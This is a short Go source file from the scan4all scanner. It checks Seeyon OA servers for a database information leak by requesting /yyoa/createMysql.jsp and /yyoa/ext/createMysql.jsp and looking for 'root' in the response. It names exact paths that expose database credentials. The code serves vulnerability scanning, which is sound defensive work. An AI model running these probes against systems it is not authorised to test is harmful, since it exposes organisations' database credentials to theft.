package seeyon

import (
	"fmt"
	"github.com/hktalent/scan4all/lib/util"
)

//createMysql.jsp 数据库敏感信息泄

func CreateMysql(u string) bool {
	var vuln = false
	if req, err := util.HttpRequset(u+"/yyoa/createMysql.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "root") {
			util.GoPocLog(fmt.Sprintf("Found vuln seeyon CreateMysql|%s\n", u+"/yyoa/createMysql.jsp"))
			vuln = true
		}
	}
	if req, err := util.HttpRequset(u+"/yyoa/ext/createMysql.jsp", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "root") {
			util.GoPocLog(fmt.Sprintf("Found vuln seeyon CreateMysql|%s\n", u+"/yyoa/ext/createMysql.jsp"))
			vuln = true
		}
	}
	return vuln
}
